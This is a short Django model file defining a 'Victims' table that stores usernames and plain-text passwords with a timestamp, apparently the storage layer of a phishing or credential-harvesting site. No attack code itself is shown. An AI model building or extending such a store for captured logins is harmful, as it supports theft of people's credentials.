from django.db import models


class Victims(models.Model):
    
    username = models.CharField(max_length = 255)
    password = models.CharField(max_length = 20)
    created_at = models.TimeField(auto_now_add = True)

    def __str__(self):
        return self.username or "Unnamed Victim"

    class Meta:
        db_table = ''
        managed = True
        verbose_name = 'Victim'
        verbose_name_plural = 'Victims'